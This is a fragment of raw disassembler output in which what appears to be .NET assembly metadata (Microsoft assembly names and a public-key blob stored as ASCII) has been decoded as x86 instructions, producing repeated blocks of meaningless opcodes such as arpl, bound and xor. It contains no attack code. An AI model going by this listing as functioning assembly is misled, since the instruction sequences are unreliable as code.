  404378:	xor    BYTE PTR [eax],dh
  40437a:	xor    BYTE PTR [eax],dh
  40437c:	xor    BYTE PTR ss:[edx],dh
  40437f:	xor    BYTE PTR [eax],dh
  404381:	xor    BYTE PTR [eax],dh
  404383:	xor    BYTE PTR [eax],dh
  404385:	xor    dh,BYTE PTR [eax+esi*1]
  404388:	xor    BYTE PTR [eax],dh
  40438a:	xor    BYTE PTR ds:0x34333532,dh
  404390:	xor    DWORD PTR [ebx],esi
  404392:	xor    DWORD PTR [eax],esi
  404394:	xor    BYTE PTR [eax],dh
  404396:	xor    al,0x30
  404398:	xor    BYTE PTR [eax],dh
  40439a:	xor    BYTE PTR [eax],dh
  40439c:	xor    DWORD PTR [eax],esi
  40439e:	xor    BYTE PTR [eax],dh
  4043a0:	xor    DWORD PTR [eax],esi
  4043a2:	xor    BYTE PTR [eax],dh
  4043a4:	aaa    
  4043a5:	xor    DWORD PTR fs:[esi+0x61],esp
  4043a9:	xor    eax,0x61346337
  4043ae:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4043b3:	popa   
  4043b4:	xor    esi,DWORD PTR [edx]
  4043b6:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4043ba:	popa   
  4043bb:	xor    BYTE PTR [esi+0x61],ah
  4043be:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4043c5:	cmp    BYTE PTR gs:[esi+0x64],ah
  4043c9:	ss popa 
  4043cb:	arpl   WORD PTR gs:[eax],di
  4043ce:	data16 cmp BYTE PTR [edi],dh
  4043d1:	bound  si,DWORD PTR [eax]
  4043d4:	xor    esi,DWORD PTR [edi]
  4043d6:	ss arpl WORD PTR ss:[eax],di
  4043da:	xor    esi,DWORD PTR [ebx+eiz*2]
  4043dd:	cmp    DWORD PTR [ecx],edi
  4043df:	cmp    DWORD PTR [edx],esi
  4043e1:	xor    DWORD PTR [ebp+0x62],esp
  4043e4:	xor    dh,BYTE PTR [ebx]
  4043e6:	bound  esp,QWORD PTR [ebp+0x37]
  4043e9:	cmp    DWORD PTR [ecx+0x64],esp
  4043ec:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4043f0:	arpl   WORD PTR [ebx+0x31],sp
  4043f3:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4043f8:	xor    dh,BYTE PTR [ebx]
  4043fa:	xor    DWORD PTR ss:[ebx],esi
  4043fd:	xor    dh,BYTE PTR [ecx]
  4043ff:	xor    BYTE PTR [edx],dh
  404401:	cmp    DWORD PTR [eax],esi
  404403:	xor    BYTE PTR [edx+0x37],ah
  404406:	xor    dh,BYTE PTR [ebx]
  404408:	arpl   WORD PTR [esi+0x39],sp
  40440b:	cmp    BYTE PTR [eax],dh
  40440d:	cmp    DWORD PTR ds:0x34636637,esi
  404413:	xor    DWORD PTR gs:[edi],esi
  404416:	aaa    
  404417:	xor    DWORD PTR [eax],esi
  404419:	cmp    BYTE PTR [esi+0x63],ah
  40441c:	xor    BYTE PTR ss:[edi],dh
  40441f:	aaa    
  404420:	aaa    
  404421:	xor    al,0x66
  404423:	xor    bh,BYTE PTR [ecx]
  404425:	cmp    BYTE PTR gs:[ebx],dh
  404428:	xor    dh,BYTE PTR [eax]
  40442a:	cmp    DWORD PTR gs:[edx],esi
  40442d:	gs popa 
  40442f:	xor    BYTE PTR ds:0x34656365,dh
  404435:	cmp    BYTE PTR gs:[edx],dh
  404438:	xor    DWORD PTR [ebx+0x30],esp
  40443b:	popa   
  40443c:	xor    eax,0x38656665
  404441:	xor    WORD PTR [esi],si
  404444:	xor    al,0x35
  404446:	arpl   WORD PTR [ebx+eiz*2],si
  404449:	xor    BYTE PTR [ebx+0x39],ah
  40444c:	xor    esp,DWORD PTR [ebx+0x31]
  40444f:	popa   
  404450:	bound  edi,QWORD PTR [ecx]
  404452:	cmp    DWORD PTR [edx],esi
  404454:	cmp    BYTE PTR ds:0x32323664,dh
  40445a:	arpl   WORD PTR [ecx+0x61],sp
  40445d:	ss xor eax,0x64316332
  404463:	popaw  
  404465:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  40446b:	xor    eax,0x32663664
  404470:	fs gs xor eax,0x65373166
  404477:	xor    eax,0x30666165
  40447c:	data16 arpl WORD PTR [ecx+edi*1],si
  404480:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404485:	xor    DWORD PTR [ebx+0x38],esp
  404488:	popa   
  404489:	xor    DWORD PTR [edx],esi
  40448b:	xor    al,0x33
  40448d:	ss xor eax,0x30323831
  404493:	ss arpl WORD PTR fs:[eax],si
  404497:	cmp    DWORD PTR [ebx],esi
  404499:	xor    esi,DWORD PTR [esp+esi*1]
  40449c:	fs xor eax,0x39326461
  4044a2:	xor    eax,DWORD PTR [eax]
  4044a4:	add    BYTE PTR [ecx-0x7efffe82],al
  4044aa:	js     0x4044f9
  4044ac:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4044b3:	je     0x4044e3
  4044b5:	dec    ecx
  4044b6:	outs   dx,BYTE PTR ds:[esi]
  4044b7:	je     0x40451e
  4044b9:	ins    BYTE PTR es:[edi],dx
  4044ba:	ins    BYTE PTR es:[edi],dx
  4044bb:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x502e6563
  4044c3:	popa   
  4044c4:	arpl   WORD PTR [ebx+0x61],bp
  4044c7:	addr16 gs cs inc ebx
  4044cb:	outs   dx,DWORD PTR ds:[esi]
  4044cc:	ins    DWORD PTR es:[edi],dx
  4044cd:	ins    DWORD PTR es:[edi],dx
  4044ce:	outs   dx,DWORD PTR ds:[esi]
  4044cf:	outs   dx,BYTE PTR ds:[esi]
  4044d0:	xor    DWORD PTR cs:[ecx],esi
  4044d3:	xor    BYTE PTR cs:[esi],ch
  4044d6:	xor    BYTE PTR [eax+eiz*1],ch
  4044d9:	push   eax
  4044da:	jne    0x40453e
  4044dc:	ins    BYTE PTR es:[edi],dx
  4044dd:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4044e4:	xor    BYTE PTR [edx],dh
  4044e6:	xor    al,0x30
  4044e8:	xor    BYTE PTR [eax],dh
  4044ea:	xor    BYTE PTR [eax],dh
  4044ec:	xor    al,0x38
  4044ee:	xor    BYTE PTR [eax],dh
  4044f0:	xor    BYTE PTR [eax],dh
  4044f2:	xor    BYTE PTR [ecx],bh
  4044f4:	xor    al,0x30
  4044f6:	xor    BYTE PTR [eax],dh
  4044f8:	xor    BYTE PTR [eax],dh
  4044fa:	xor    BYTE PTR [eax],dh
  4044fc:	xor    BYTE PTR ss:[edx],dh
  4044ff:	xor    BYTE PTR [eax],dh
  404501:	xor    BYTE PTR [eax],dh
  404503:	xor    BYTE PTR [eax],dh
  404505:	xor    dh,BYTE PTR [eax+esi*1]
  404508:	xor    BYTE PTR [eax],dh
  40450a:	xor    BYTE PTR ds:0x34333532,dh
  404510:	xor    DWORD PTR [ebx],esi
  404512:	xor    DWORD PTR [eax],esi
  404514:	xor    BYTE PTR [eax],dh
  404516:	xor    al,0x30
  404518:	xor    BYTE PTR [eax],dh
  40451a:	xor    BYTE PTR [eax],dh
  40451c:	xor    DWORD PTR [eax],esi
  40451e:	xor    BYTE PTR [eax],dh
  404520:	xor    DWORD PTR [eax],esi
  404522:	xor    BYTE PTR [eax],dh
  404524:	aaa    
  404525:	xor    DWORD PTR fs:[esi+0x61],esp
  404529:	xor    eax,0x61346337
  40452e:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404533:	popa   
  404534:	xor    esi,DWORD PTR [edx]
  404536:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40453a:	popa   
  40453b:	xor    BYTE PTR [esi+0x61],ah
  40453e:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  404545:	cmp    BYTE PTR gs:[esi+0x64],ah
  404549:	ss popa 
  40454b:	arpl   WORD PTR gs:[eax],di
  40454e:	data16 cmp BYTE PTR [edi],dh
  404551:	bound  si,DWORD PTR [eax]
  404554:	xor    esi,DWORD PTR [edi]
  404556:	ss arpl WORD PTR ss:[eax],di
  40455a:	xor    esi,DWORD PTR [ebx+eiz*2]
  40455d:	cmp    DWORD PTR [ecx],edi
  40455f:	cmp    DWORD PTR [edx],esi
  404561:	xor    DWORD PTR [ebp+0x62],esp
  404564:	xor    dh,BYTE PTR [ebx]
  404566:	bound  esp,QWORD PTR [ebp+0x37]
  404569:	cmp    DWORD PTR [ecx+0x64],esp
  40456c:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404570:	arpl   WORD PTR [ebx+0x31],sp
  404573:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404578:	xor    dh,BYTE PTR [ebx]
  40457a:	xor    DWORD PTR ss:[ebx],esi
  40457d:	xor    dh,BYTE PTR [ecx]
  40457f:	xor    BYTE PTR [edx],dh
  404581:	cmp    DWORD PTR [eax],esi
  404583:	xor    BYTE PTR [edx+0x37],ah
  404586:	xor    dh,BYTE PTR [ebx]
  404588:	arpl   WORD PTR [esi+0x39],sp
  40458b:	cmp    BYTE PTR [eax],dh
  40458d:	cmp    DWORD PTR ds:0x34636637,esi
  404593:	xor    DWORD PTR gs:[edi],esi
  404596:	aaa    
  404597:	xor    DWORD PTR [eax],esi
  404599:	cmp    BYTE PTR [esi+0x63],ah
  40459c:	xor    BYTE PTR ss:[edi],dh
  40459f:	aaa    
  4045a0:	aaa    
  4045a1:	xor    al,0x66
  4045a3:	xor    bh,BYTE PTR [ecx]
  4045a5:	cmp    BYTE PTR gs:[ebx],dh
  4045a8:	xor    dh,BYTE PTR [eax]
  4045aa:	cmp    DWORD PTR gs:[edx],esi
  4045ad:	gs popa 
  4045af:	xor    BYTE PTR ds:0x34656365,dh
  4045b5:	cmp    BYTE PTR gs:[edx],dh
  4045b8:	xor    DWORD PTR [ebx+0x30],esp
  4045bb:	popa   
  4045bc:	xor    eax,0x38656665
  4045c1:	xor    WORD PTR [esi],si
  4045c4:	xor    al,0x35
  4045c6:	arpl   WORD PTR [ebx+eiz*2],si
  4045c9:	xor    BYTE PTR [ebx+0x39],ah
  4045cc:	xor    esp,DWORD PTR [ebx+0x31]
  4045cf:	popa   
  4045d0:	bound  edi,QWORD PTR [ecx]
  4045d2:	cmp    DWORD PTR [edx],esi
  4045d4:	cmp    BYTE PTR ds:0x32323664,dh
  4045da:	arpl   WORD PTR [ecx+0x61],sp
  4045dd:	ss xor eax,0x64316332
  4045e3:	popaw  
  4045e5:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4045eb:	xor    eax,0x32663664
  4045f0:	fs gs xor eax,0x65373166
  4045f7:	xor    eax,0x30666165
  4045fc:	data16 arpl WORD PTR [ecx+edi*1],si
  404600:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404605:	xor    DWORD PTR [ebx+0x38],esp
  404608:	popa   
  404609:	xor    DWORD PTR [edx],esi
  40460b:	xor    al,0x33
  40460d:	ss xor eax,0x30323831
  404613:	ss arpl WORD PTR fs:[eax],si
  404617:	cmp    DWORD PTR [ebx],esi
  404619:	xor    esi,DWORD PTR [esp+esi*1]
  40461c:	fs xor eax,0x39326461
  404622:	xor    eax,DWORD PTR [eax]
  404624:	add    BYTE PTR [ecx-0x7efffe7c],al
  40462a:	jle    0x404679
  40462c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404633:	je     0x404663
  404635:	dec    ecx
  404636:	outs   dx,BYTE PTR ds:[esi]
  404637:	je     0x40469e
  404639:	ins    BYTE PTR es:[edi],dx
  40463a:	ins    BYTE PTR es:[edi],dx
  40463b:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x502e6563
  404643:	popa   
  404644:	arpl   WORD PTR [ebx+0x61],bp
  404647:	addr16 gs cs inc ebx
  40464b:	outs   dx,DWORD PTR ds:[esi]
  40464c:	ins    DWORD PTR es:[edi],dx
  40464d:	ins    DWORD PTR es:[edi],dx
  40464e:	outs   dx,DWORD PTR ds:[esi]
  40464f:	outs   dx,BYTE PTR ds:[esi]
  404650:	xor    DWORD PTR cs:[ecx],esi
  404653:	xor    BYTE PTR cs:[esi],ch
  404656:	xor    BYTE PTR [esi],ch
  404658:	push   esp
  404659:	gs jae 0x4046d0
  40465c:	jae    0x40468a
  40465e:	and    BYTE PTR [eax+0x75],dl
  404661:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404665:	dec    ebx
  404666:	gs jns 0x4046a6
  404669:	xor    BYTE PTR [eax],dh
  40466b:	xor    dh,BYTE PTR [eax+esi*1]
  40466e:	xor    BYTE PTR [eax],dh
  404670:	xor    BYTE PTR [eax],dh
  404672:	xor    al,0x38
  404674:	xor    BYTE PTR [eax],dh
  404676:	xor    BYTE PTR [eax],dh
  404678:	xor    BYTE PTR [ecx],bh
  40467a:	xor    al,0x30
  40467c:	xor    BYTE PTR [eax],dh
  40467e:	xor    BYTE PTR [eax],dh
  404680:	xor    BYTE PTR [eax],dh
  404682:	xor    BYTE PTR ss:[edx],dh
  404685:	xor    BYTE PTR [eax],dh
  404687:	xor    BYTE PTR [eax],dh
  404689:	xor    BYTE PTR [eax],dh
  40468b:	xor    dh,BYTE PTR [eax+esi*1]
  40468e:	xor    BYTE PTR [eax],dh
  404690:	xor    BYTE PTR ds:0x34333532,dh
  404696:	xor    DWORD PTR [ebx],esi
  404698:	xor    DWORD PTR [eax],esi
  40469a:	xor    BYTE PTR [eax],dh
  40469c:	xor    al,0x30
  40469e:	xor    BYTE PTR [eax],dh
  4046a0:	xor    BYTE PTR [eax],dh
  4046a2:	xor    DWORD PTR [eax],esi
  4046a4:	xor    BYTE PTR [eax],dh
  4046a6:	xor    DWORD PTR [eax],esi
  4046a8:	xor    BYTE PTR [eax],dh
  4046aa:	aaa    
  4046ab:	xor    DWORD PTR fs:[esi+0x61],esp
  4046af:	xor    eax,0x61346337
  4046b4:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4046b9:	popa   
  4046ba:	xor    esi,DWORD PTR [edx]
  4046bc:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4046c0:	popa   
  4046c1:	xor    BYTE PTR [esi+0x61],ah
  4046c4:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4046cb:	cmp    BYTE PTR gs:[esi+0x64],ah
  4046cf:	ss popa 
  4046d1:	arpl   WORD PTR gs:[eax],di
  4046d4:	data16 cmp BYTE PTR [edi],dh
  4046d7:	bound  si,DWORD PTR [eax]
  4046da:	xor    esi,DWORD PTR [edi]
  4046dc:	ss arpl WORD PTR ss:[eax],di
  4046e0:	xor    esi,DWORD PTR [ebx+eiz*2]
  4046e3:	cmp    DWORD PTR [ecx],edi
  4046e5:	cmp    DWORD PTR [edx],esi
  4046e7:	xor    DWORD PTR [ebp+0x62],esp
  4046ea:	xor    dh,BYTE PTR [ebx]
  4046ec:	bound  esp,QWORD PTR [ebp+0x37]
  4046ef:	cmp    DWORD PTR [ecx+0x64],esp
  4046f2:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4046f6:	arpl   WORD PTR [ebx+0x31],sp
  4046f9:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4046fe:	xor    dh,BYTE PTR [ebx]
  404700:	xor    DWORD PTR ss:[ebx],esi
  404703:	xor    dh,BYTE PTR [ecx]
  404705:	xor    BYTE PTR [edx],dh
  404707:	cmp    DWORD PTR [eax],esi
  404709:	xor    BYTE PTR [edx+0x37],ah
  40470c:	xor    dh,BYTE PTR [ebx]
  40470e:	arpl   WORD PTR [esi+0x39],sp
  404711:	cmp    BYTE PTR [eax],dh
  404713:	cmp    DWORD PTR ds:0x34636637,esi
  404719:	xor    DWORD PTR gs:[edi],esi
  40471c:	aaa    
  40471d:	xor    DWORD PTR [eax],esi
  40471f:	cmp    BYTE PTR [esi+0x63],ah
  404722:	xor    BYTE PTR ss:[edi],dh
  404725:	aaa    
  404726:	aaa    
  404727:	xor    al,0x66
  404729:	xor    bh,BYTE PTR [ecx]
  40472b:	cmp    BYTE PTR gs:[ebx],dh
  40472e:	xor    dh,BYTE PTR [eax]
  404730:	cmp    DWORD PTR gs:[edx],esi
  404733:	gs popa 
  404735:	xor    BYTE PTR ds:0x34656365,dh
  40473b:	cmp    BYTE PTR gs:[edx],dh
  40473e:	xor    DWORD PTR [ebx+0x30],esp
  404741:	popa   
  404742:	xor    eax,0x38656665
  404747:	xor    WORD PTR [esi],si
  40474a:	xor    al,0x35
  40474c:	arpl   WORD PTR [ebx+eiz*2],si
  40474f:	xor    BYTE PTR [ebx+0x39],ah
  404752:	xor    esp,DWORD PTR [ebx+0x31]
  404755:	popa   
  404756:	bound  edi,QWORD PTR [ecx]
  404758:	cmp    DWORD PTR [edx],esi
  40475a:	cmp    BYTE PTR ds:0x32323664,dh
  404760:	arpl   WORD PTR [ecx+0x61],sp
  404763:	ss xor eax,0x64316332
  404769:	popaw  
  40476b:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  404771:	xor    eax,0x32663664
  404776:	fs gs xor eax,0x65373166
  40477d:	xor    eax,0x30666165
  404782:	data16 arpl WORD PTR [ecx+edi*1],si
  404786:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40478b:	xor    DWORD PTR [ebx+0x38],esp
  40478e:	popa   
  40478f:	xor    DWORD PTR [edx],esi
  404791:	xor    al,0x33
  404793:	ss xor eax,0x30323831
  404799:	ss arpl WORD PTR fs:[eax],si
  40479d:	cmp    DWORD PTR [ebx],esi
  40479f:	xor    esi,DWORD PTR [esp+esi*1]
  4047a2:	fs xor eax,0x39326461
  4047a8:	xor    eax,DWORD PTR [eax]
  4047aa:	add    BYTE PTR [ecx-0x7efffe82],al
  4047b0:	js     0x4047ff
  4047b2:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4047b9:	je     0x4047e9
  4047bb:	dec    ecx
  4047bc:	outs   dx,BYTE PTR ds:[esi]
  4047bd:	je     0x404824
  4047bf:	ins    BYTE PTR es:[edi],dx
  4047c0:	ins    BYTE PTR es:[edi],dx
  4047c1:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x442e6563
  4047c9:	bound  esi,QWORD PTR gs:[ebp+0x67]
  4047cd:	addr16 gs jb 0x40481e
  4047d1:	popa   
  4047d2:	jb     0x40483b
  4047d4:	imul   ebp,DWORD PTR [esi+0x2e],0x302e3131
  4047db:	xor    BYTE PTR cs:[eax+eiz*1],ch
  4047df:	push   eax
  4047e0:	jne    0x404844
  4047e2:	ins    BYTE PTR es:[edi],dx
  4047e3:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4047ea:	xor    BYTE PTR [edx],dh
  4047ec:	xor    al,0x30
  4047ee:	xor    BYTE PTR [eax],dh
  4047f0:	xor    BYTE PTR [eax],dh
  4047f2:	xor    al,0x38
  4047f4:	xor    BYTE PTR [eax],dh
  4047f6:	xor    BYTE PTR [eax],dh
  4047f8:	xor    BYTE PTR [ecx],bh
  4047fa:	xor    al,0x30
  4047fc:	xor    BYTE PTR [eax],dh
  4047fe:	xor    BYTE PTR [eax],dh
  404800:	xor    BYTE PTR [eax],dh
  404802:	xor    BYTE PTR ss:[edx],dh
  404805:	xor    BYTE PTR [eax],dh
  404807:	xor    BYTE PTR [eax],dh
  404809:	xor    BYTE PTR [eax],dh
  40480b:	xor    dh,BYTE PTR [eax+esi*1]
  40480e:	xor    BYTE PTR [eax],dh
  404810:	xor    BYTE PTR ds:0x34333532,dh
  404816:	xor    DWORD PTR [ebx],esi
  404818:	xor    DWORD PTR [eax],esi
  40481a:	xor    BYTE PTR [eax],dh
  40481c:	xor    al,0x30
  40481e:	xor    BYTE PTR [eax],dh
  404820:	xor    BYTE PTR [eax],dh
  404822:	xor    DWORD PTR [eax],esi
  404824:	xor    BYTE PTR [eax],dh
  404826:	xor    DWORD PTR [eax],esi
  404828:	xor    BYTE PTR [eax],dh
  40482a:	aaa    
  40482b:	xor    DWORD PTR fs:[esi+0x61],esp
  40482f:	xor    eax,0x61346337
  404834:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404839:	popa   
  40483a:	xor    esi,DWORD PTR [edx]
  40483c:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  404840:	popa   
  404841:	xor    BYTE PTR [esi+0x61],ah
  404844:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40484b:	cmp    BYTE PTR gs:[esi+0x64],ah
  40484f:	ss popa 
  404851:	arpl   WORD PTR gs:[eax],di
  404854:	data16 cmp BYTE PTR [edi],dh
  404857:	bound  si,DWORD PTR [eax]
  40485a:	xor    esi,DWORD PTR [edi]
  40485c:	ss arpl WORD PTR ss:[eax],di
  404860:	xor    esi,DWORD PTR [ebx+eiz*2]
  404863:	cmp    DWORD PTR [ecx],edi
  404865:	cmp    DWORD PTR [edx],esi
  404867:	xor    DWORD PTR [ebp+0x62],esp
  40486a:	xor    dh,BYTE PTR [ebx]
  40486c:	bound  esp,QWORD PTR [ebp+0x37]
  40486f:	cmp    DWORD PTR [ecx+0x64],esp
  404872:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404876:	arpl   WORD PTR [ebx+0x31],sp
  404879:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40487e:	xor    dh,BYTE PTR [ebx]
  404880:	xor    DWORD PTR ss:[ebx],esi
  404883:	xor    dh,BYTE PTR [ecx]
  404885:	xor    BYTE PTR [edx],dh
  404887:	cmp    DWORD PTR [eax],esi
  404889:	xor    BYTE PTR [edx+0x37],ah
  40488c:	xor    dh,BYTE PTR [ebx]
  40488e:	arpl   WORD PTR [esi+0x39],sp
  404891:	cmp    BYTE PTR [eax],dh
  404893:	cmp    DWORD PTR ds:0x34636637,esi
  404899:	xor    DWORD PTR gs:[edi],esi
  40489c:	aaa    
  40489d:	xor    DWORD PTR [eax],esi
  40489f:	cmp    BYTE PTR [esi+0x63],ah
  4048a2:	xor    BYTE PTR ss:[edi],dh
  4048a5:	aaa    
  4048a6:	aaa    
  4048a7:	xor    al,0x66
  4048a9:	xor    bh,BYTE PTR [ecx]
  4048ab:	cmp    BYTE PTR gs:[ebx],dh
  4048ae:	xor    dh,BYTE PTR [eax]
  4048b0:	cmp    DWORD PTR gs:[edx],esi
  4048b3:	gs popa 
  4048b5:	xor    BYTE PTR ds:0x34656365,dh
  4048bb:	cmp    BYTE PTR gs:[edx],dh
  4048be:	xor    DWORD PTR [ebx+0x30],esp
  4048c1:	popa   
  4048c2:	xor    eax,0x38656665
  4048c7:	xor    WORD PTR [esi],si
  4048ca:	xor    al,0x35
  4048cc:	arpl   WORD PTR [ebx+eiz*2],si
  4048cf:	xor    BYTE PTR [ebx+0x39],ah
  4048d2:	xor    esp,DWORD PTR [ebx+0x31]
  4048d5:	popa   
  4048d6:	bound  edi,QWORD PTR [ecx]
  4048d8:	cmp    DWORD PTR [edx],esi
  4048da:	cmp    BYTE PTR ds:0x32323664,dh
  4048e0:	arpl   WORD PTR [ecx+0x61],sp
  4048e3:	ss xor eax,0x64316332
  4048e9:	popaw  
  4048eb:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4048f1:	xor    eax,0x32663664
  4048f6:	fs gs xor eax,0x65373166
  4048fd:	xor    eax,0x30666165
  404902:	data16 arpl WORD PTR [ecx+edi*1],si
  404906:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40490b:	xor    DWORD PTR [ebx+0x38],esp
  40490e:	popa   
  40490f:	xor    DWORD PTR [edx],esi
  404911:	xor    al,0x33
  404913:	ss xor eax,0x30323831
  404919:	ss arpl WORD PTR fs:[eax],si
  40491d:	cmp    DWORD PTR [ebx],esi
  40491f:	xor    esi,DWORD PTR [esp+esi*1]
  404922:	fs xor eax,0x39326461
  404928:	xor    eax,DWORD PTR [eax]
  40492a:	add    BYTE PTR [ecx-0x7efffe84],al
  404930:	jbe    0x40497f
  404932:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404939:	je     0x404969
  40493b:	dec    ecx
  40493c:	outs   dx,BYTE PTR ds:[esi]
  40493d:	je     0x4049a4
  40493f:	ins    BYTE PTR es:[edi],dx
  404940:	ins    BYTE PTR es:[edi],dx
  404941:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x532e6563
  404949:	gs popa 
  40494b:	jb     0x4049b0
  40494d:	push   0x6772614d
  404952:	imul   ebp,DWORD PTR [esi+0x2e],0x302e3131
  404959:	xor    BYTE PTR cs:[eax+eiz*1],ch
  40495d:	push   eax
  40495e:	jne    0x4049c2
  404960:	ins    BYTE PTR es:[edi],dx
  404961:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  404968:	xor    BYTE PTR [edx],dh
  40496a:	xor    al,0x30
  40496c:	xor    BYTE PTR [eax],dh
  40496e:	xor    BYTE PTR [eax],dh
  404970:	xor    al,0x38
  404972:	xor    BYTE PTR [eax],dh
  404974:	xor    BYTE PTR [eax],dh
  404976:	xor    BYTE PTR [ecx],bh
  404978:	xor    al,0x30
  40497a:	xor    BYTE PTR [eax],dh
  40497c:	xor    BYTE PTR [eax],dh
  40497e:	xor    BYTE PTR [eax],dh
  404980:	xor    BYTE PTR ss:[edx],dh
  404983:	xor    BYTE PTR [eax],dh
  404985:	xor    BYTE PTR [eax],dh
  404987:	xor    BYTE PTR [eax],dh
  404989:	xor    dh,BYTE PTR [eax+esi*1]
  40498c:	xor    BYTE PTR [eax],dh
  40498e:	xor    BYTE PTR ds:0x34333532,dh
  404994:	xor    DWORD PTR [ebx],esi
  404996:	xor    DWORD PTR [eax],esi
  404998:	xor    BYTE PTR [eax],dh
  40499a:	xor    al,0x30
  40499c:	xor    BYTE PTR [eax],dh
  40499e:	xor    BYTE PTR [eax],dh
  4049a0:	xor    DWORD PTR [eax],esi
  4049a2:	xor    BYTE PTR [eax],dh
  4049a4:	xor    DWORD PTR [eax],esi
  4049a6:	xor    BYTE PTR [eax],dh
  4049a8:	aaa    
  4049a9:	xor    DWORD PTR fs:[esi+0x61],esp
  4049ad:	xor    eax,0x61346337
  4049b2:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4049b7:	popa   
  4049b8:	xor    esi,DWORD PTR [edx]
  4049ba:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4049be:	popa   
  4049bf:	xor    BYTE PTR [esi+0x61],ah
  4049c2:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4049c9:	cmp    BYTE PTR gs:[esi+0x64],ah
  4049cd:	ss popa 
  4049cf:	arpl   WORD PTR gs:[eax],di
  4049d2:	data16 cmp BYTE PTR [edi],dh
  4049d5:	bound  si,DWORD PTR [eax]
  4049d8:	xor    esi,DWORD PTR [edi]
  4049da:	ss arpl WORD PTR ss:[eax],di
  4049de:	xor    esi,DWORD PTR [ebx+eiz*2]
  4049e1:	cmp    DWORD PTR [ecx],edi
  4049e3:	cmp    DWORD PTR [edx],esi
  4049e5:	xor    DWORD PTR [ebp+0x62],esp
  4049e8:	xor    dh,BYTE PTR [ebx]
  4049ea:	bound  esp,QWORD PTR [ebp+0x37]
  4049ed:	cmp    DWORD PTR [ecx+0x64],esp
  4049f0:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4049f4:	arpl   WORD PTR [ebx+0x31],sp
  4049f7:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4049fc:	xor    dh,BYTE PTR [ebx]
  4049fe:	xor    DWORD PTR ss:[ebx],esi
  404a01:	xor    dh,BYTE PTR [ecx]
  404a03:	xor    BYTE PTR [edx],dh
  404a05:	cmp    DWORD PTR [eax],esi
  404a07:	xor    BYTE PTR [edx+0x37],ah
  404a0a:	xor    dh,BYTE PTR [ebx]
  404a0c:	arpl   WORD PTR [esi+0x39],sp
  404a0f:	cmp    BYTE PTR [eax],dh
  404a11:	cmp    DWORD PTR ds:0x34636637,esi
  404a17:	xor    DWORD PTR gs:[edi],esi
  404a1a:	aaa    
  404a1b:	xor    DWORD PTR [eax],esi
  404a1d:	cmp    BYTE PTR [esi+0x63],ah
  404a20:	xor    BYTE PTR ss:[edi],dh
  404a23:	aaa    
  404a24:	aaa    
  404a25:	xor    al,0x66
  404a27:	xor    bh,BYTE PTR [ecx]
  404a29:	cmp    BYTE PTR gs:[ebx],dh
  404a2c:	xor    dh,BYTE PTR [eax]
  404a2e:	cmp    DWORD PTR gs:[edx],esi
  404a31:	gs popa 
  404a33:	xor    BYTE PTR ds:0x34656365,dh
  404a39:	cmp    BYTE PTR gs:[edx],dh
  404a3c:	xor    DWORD PTR [ebx+0x30],esp
  404a3f:	popa   
  404a40:	xor    eax,0x38656665
  404a45:	xor    WORD PTR [esi],si
  404a48:	xor    al,0x35
  404a4a:	arpl   WORD PTR [ebx+eiz*2],si
  404a4d:	xor    BYTE PTR [ebx+0x39],ah
  404a50:	xor    esp,DWORD PTR [ebx+0x31]
  404a53:	popa   
  404a54:	bound  edi,QWORD PTR [ecx]
  404a56:	cmp    DWORD PTR [edx],esi
  404a58:	cmp    BYTE PTR ds:0x32323664,dh
  404a5e:	arpl   WORD PTR [ecx+0x61],sp
  404a61:	ss xor eax,0x64316332
  404a67:	popaw  
  404a69:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  404a6f:	xor    eax,0x32663664
  404a74:	fs gs xor eax,0x65373166
  404a7b:	xor    eax,0x30666165
  404a80:	data16 arpl WORD PTR [ecx+edi*1],si
  404a84:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404a89:	xor    DWORD PTR [ebx+0x38],esp
  404a8c:	popa   
  404a8d:	xor    DWORD PTR [edx],esi
  404a8f:	xor    al,0x33
  404a91:	ss xor eax,0x30323831
  404a97:	ss arpl WORD PTR fs:[eax],si
  404a9b:	cmp    DWORD PTR [ebx],esi
